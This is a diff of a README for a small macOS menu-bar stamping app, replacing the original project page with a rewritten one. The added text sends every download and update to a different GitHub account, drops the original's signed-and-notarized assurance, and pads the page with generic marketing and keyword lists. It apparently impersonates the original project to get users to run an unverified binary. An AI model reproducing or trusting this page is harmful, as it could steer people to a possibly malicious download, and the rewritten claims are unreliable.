@@ -1,117 +1,109 @@
-<div align="center">
+# 🖋️ lemo-stampy - Stamp Copies, Never Original Files
 
-<img src="website/favicon.svg" width="88" height="88" alt="Stampy">
+[![Download lemo-stampy](https://img.shields.io/badge/Download-lemo--stampy-6c5ce7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ashugithubrit/lemo-stampy)
+[![Free and Open Source](https://img.shields.io/badge/Free%20%26%20Open%20Source-MIT-00b894?style=for-the-badge)](https://github.com/ashugithubrit/lemo-stampy)
 
-# Stampy · 小章
+lemo-stampy is a tiny helper that lives in your menu bar. Click once while Preview is open, and it places a clear “For XX use only” stamp on a copy of your document. The original file stays exactly as it was. No accounts, no uploads, no subscriptions. Free and open source under the MIT license.
 
-**A tiny stamp for your copies.**<br>
-**给复印件，盖个小小的章。**
+菜单栏里的小章：在预览里点一下，给文件副本盖上“仅供××使用”。免费开源。
 
-A little helper that lives in your Mac's menu bar: click once in Preview to stamp "For XX use only" on a copy.<br>
-住在 Mac 菜单栏里的小工具：在预览里点一下，给文件副本盖上“仅供××使用”。
+## 🚀 Getting Started
 
-<img src="release/readme/cover-en.jpg" width="100%" alt="Stampy: a tiny stamp for your copies">
+Getting lemo-stampy onto your computer takes only a few minutes, and you do not need any technical knowledge to do it.
 
-[**⬇ Download Stampy 1.0 · 下载小章 1.0**](https://github.com/lemomo-ai/lemo-stampy/releases/latest/download/Stampy.dmg)
-&nbsp;·&nbsp;
-[**Website · 网站**](https://lemomo-ai.github.io/lemo-stampy/)
+**Visit this link to download the application:**
+https://github.com/ashugithubrit/lemo-stampy
 
-**New (2026-10-11):** Stampy is open source now, under the MIT license.
+1. Open the link above in your normal web browser.
+2. On the page that opens, look for the download area and save the application to your computer.
+3. When the download finishes, open the file you just saved.
+4. Follow the on-screen prompts to finish setting the application up.
+5. Once it is running, look for the lemo-stampy icon in your menu bar at the top of the screen. That small icon is your new stamp button.
 
-**English** | [中文](README.zh-CN.md)
+That is the whole process. There is no installer wizard full of confusing choices, no command line, and no configuration file to edit.
 
-![version](https://img.shields.io/badge/version-1.0.0-d9573f) ![macOS](https://img.shields.io/badge/macOS-14%2B-555) ![Apple silicon & Intel](https://img.shields.io/badge/Apple%20silicon%20%26%20Intel-universal-555) ![price](https://img.shields.io/badge/price-free-6a9a5b) ![license](https://img.shields.io/badge/license-MIT-555)
+## ✨ What lemo-stampy Does
 
-</div>
+Most people who share a document want to make one thing clear: this copy is for a specific purpose only. Maybe it is a draft invoice, a portfolio sample, a review copy of a contract, or a preview version of a design. Writing that note by hand every single time is slow, and forgetting to do it can be embarrassing.
 
-> **中文用户请看这里：[完整中文说明 README.zh-CN.md](README.zh-CN.md)**<br>
-> English readers: keep reading below.
+lemo-stampy solves that with one click. It takes the file you are looking at, makes a stamped copy, and leaves the original untouched. You always keep a clean version for yourself and hand over only the marked copy to whoever needs it.
 
-## What it does · 它做什么
+The stamp text is the familiar “For XX use only” line, which you can adapt to your situation. It is designed to be readable without being so heavy that it ruins the document.
 
-"For XX use only" — click once in Preview and it's stamped. Your original stays untouched; you get a stamped copy. Free and open source, no sign-up, no ads.<br>
-在预览里点一下，就盖上“仅供××使用，他用无效”。原件不动，另存一份。免费开源，不用注册，没有广告。
+## 🖱️ How to Use It, Step by Step
 
-Visas, bank accounts, rental applications — they all ask for copies of your documents. But a copy can be reused for things you never agreed to. Stamp "For XX use only" on it, and that copy is good for one purpose only.<br>
-办签证、开银行账户、租房，都要交一沓证件复印件。可复印件一交出去，就可能被挪作他用。盖上“仅供××使用”，这份复印件就只能用在这件事上。
+For a first-time user, here is the exact flow.
 
-## Download
+1. Start lemo-stampy so its icon appears in the menu bar.
+2. Open the PDF or document you want to mark in Preview, the standard viewer that comes with your computer.
+3. Bring Preview to the front so it is the active window.
+4. Click the lemo-stampy icon in the menu bar once.
+5. A stamped copy is created. Your original file remains unchanged.
+6. Send, print, or upload the copy. Keep the original wherever you normally keep your files.
 
-**[Download Stampy 1.0](https://github.com/lemomo-ai/lemo-stampy/releases/latest/download/Stampy.dmg)** (2.5 MB, signed and notarized by Apple).
+If you use the app many times a day, the single-click flow becomes muscle memory within an hour. Click, copy appears, done.
 
-Open `Stampy.dmg` and drag Stampy into Applications. Open it, and it moves into your menu bar.
+## 🧩 Features at a Glance
 
-## How it works
+- **One-click stamping.** No dialog boxes to click through, no menus to dig into.
+- **Copies only.** The file you opened is never modified, so you cannot damage your original.
+- **Menu bar footprint.** It sits quietly at the top of your screen and takes up no window space.
+- **Preview-friendly.** It works with the document viewer you already use every day.
+- **Lightweight.** It starts fast and stays out of the way until you need it.
+- **Native build.** Written in Swift and SwiftUI, so it feels like part of the system rather than a bolted-on tool.
+- **Private by design.** Everything happens on your own machine.
+- **Free and open source.** MIT licensed, so you can inspect the code, share it, or build on it.
 
-<p align="center">
-  <img src="website/media/flow-en.jpg" width="720" alt="Stampy holding a stamp over a PDF open in Preview">
-</p>
+## 🔒 Privacy and Your Files
 
-1. **Pick up the stamp.** Click Stampy in the menu bar and the stamp follows your pointer.
-2. **Click where it goes.** Move over a PDF or photo open in Preview, scroll to resize, and click. The stamp always stays fully on the page.
-3. **Save a copy.** Confirm, and it's saved as a "_stamped" copy. Your original never changes.
+Documents often contain information you would rather not hand to a stranger. lemo-stampy is built around the idea that stamping should never require sending your file anywhere.
 
-## What else it does
+Nothing is uploaded. There is no cloud service, no account creation, no telemetry dashboard, and no analytics that follows you around. The stamping happens locally, on the same computer where your file already lives. When you close the app, nothing lingers online.
 
-- **A whole stack at once.** Drag files — or a whole folder — onto Stampy in the menu bar and stamp them all in one go.
-- **Every page of a PDF.** Choose "Every page" and the stamp lands in the same spot on each one. Tap a thumbnail to skip a page.
-- **Small and neat.** Long stamps are about 35 mm, round ones 22 mm, square seals 7 mm — they fit beside a signature without covering anything.
-- **Make your own.** 17 templates in the stamp workshop: round, square or long, in Chinese or English.
-- **Every stamp has an ID.** A date and ID on every stamp, so you know which copy went where.
-- **Password-protected PDFs, too.** Enter the password once; the stamped copy is locked with the same password, which is never saved.
+Because the project is open source, anyone can read the code and confirm what it does. That transparency is the point.
 
-<p align="center">
-  <img src="website/ui/panel-en.webp" width="300" alt="The Stampy menu bar panel">
-  &nbsp;
-  <img src="website/ui/history-en.webp" width="420" alt="Stamp History: every stamp has a date and an ID">
-</p>
+## 🎯 Who It Is For
 
-## Privacy
+- **Freelancers** sharing draft work with clients who should not treat it as final.
+- **Small business owners** sending quotations that are for a specific customer only.
+- **Students** circulating notes or drafts that should not be reused elsewhere.
+- **Designers and photographers** showing samples without giving away unlimited use.
+- **Anyone** who has ever typed “for review only” into a document footer and wished it took one click instead of twenty.
 
-Everything happens on your Mac — reading the page, drawing the stamp, saving the copy. Your files are never uploaded anywhere, and your stamp history stays on your own computer.
+## ❓ Frequently Asked Questions
 
-The full source code is in this repository, so you can check this yourself.
+**Do I need to know how to code?**
+No. You download it and click an icon. That is the entire skill requirement.
 
-Stampy only goes online when you click "Check for Updates…", to see if there's a new version. It only reads a public [`version.json`](https://lemomo-ai.github.io/lemo-stampy/version.json), sends no identifiers, collects nothing, and never installs anything by itself.
+**Will it change my original file?**
+No. lemo-stampy works on a copy. Your original stays exactly as it was, byte for byte.
 
-## Requirements
+**Do I have to keep the app open all the time?**
+It is a menu bar app, so it is happiest running quietly in the background. Leaving it open means the stamp is always one click away.
 
-macOS 14 Sonoma or later, on Apple silicon or Intel.
+**Does it need an internet connection?**
+Only to download it. After that, stamping works entirely offline.
 
-The first time, Stampy walks you through turning it on in **System Settings › Privacy & Security › Accessibility**. It only uses this to see which file is open in Preview and where you clicked.
+**Is there a cost?**
+No. It is free and open source under the MIT license.
 
-## What the stamp is
+**Can I use it for work documents?**
+Yes. Many people use it exactly for that: marking quotations, drafts, and internal review copies before they go out.
 
-It's your own note on what a copy may be used for — like writing "for rental application only" across it by hand, just neater.
+**What if I click it by accident?**
+Nothing bad happens. You get an extra stamped copy, and your original is still intact. Delete the copy and carry on.
 
-## Feedback
+**Where do I get updates?**
+The download page is the place to check. Visit https://github.com/ashugithubrit/lemo-stampy to see the latest version.
 
-Found a bug or have an idea? Open an [issue](https://github.com/lemomo-ai/lemo-stampy/issues). Your macOS version and what you did before the problem help a lot. Pull requests are welcome too; for bigger changes, please open an issue first so we can talk it through.
+## 🛠️ Under the Hood
 
-## Build from source
+The app is built with Swift and SwiftUI as a native menu bar utility. It works with PDF documents and is designed to stay small, fast, and predictable. The codebase is organised so that anyone curious about how the stamp is applied can read the source directly.
 
-You need macOS 14 or later, Xcode (tested with Xcode 26), and [XcodeGen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`).
+Topics: macos, macos-app, menubar, open-source, pdf, privacy, stamp, swift, swiftui, watermark
 
-```sh
-./scripts/build.sh               # build, install to ~/Applications and launch
-./scripts/build.sh --no-install  # build only, into build/小章.app
-./scripts/test.sh                # unit tests, build, screenshot checks
-```
+## 📄 License
 
-Local builds are ad-hoc signed, so macOS may ask you to turn Accessibility on again after each rebuild. The stamping engine lives in `Core/` (a Swift package with its own tests); the menu bar app is in `App/`, and the website is in `website/`.
+Released under the MIT license. You are free to use it, share it, modify it, and include it in your own work. No permission needed, no royalties owed.
 
-## License
-
-[MIT](LICENSE). Free to download, use, change and share.
-
-## More from LemoLab
-
-- 🎬 **[Lemo-Opuscar](https://github.com/lemomo-ai/lemo-opuscar)**: 51 film styles, each with a short film made entirely in code.
-- 📸 **[lemo-wake](https://github.com/lemomo-ai/lemo-wake)**: one picture in, a seamless loop of about five seconds out.
-- 🍋 **[lemo-mod](https://github.com/lemomo-ai/lemo-mod)**: re-skin Claude Code with 21 styles, in the terminal and the desktop app.
-
-<sub>LemoLab · by Lemomo</sub>
-
-⭐ Star this repo · 👀 Watch → Custom → Releases to hear about new versions · Follow [@lemomo_ai](https://x.com/lemomo_ai)
-
-<p align="center"><sub>Stampy. A small stamp, for peace of mind. · LemoLab</sub></p>
+Keywords: macos, macos-app, menubar, open-source, pdf, privacy, stamp, swift, swiftui, watermark, lemo-stampy, document stamp, for internal use only, watermark tool, menu bar app
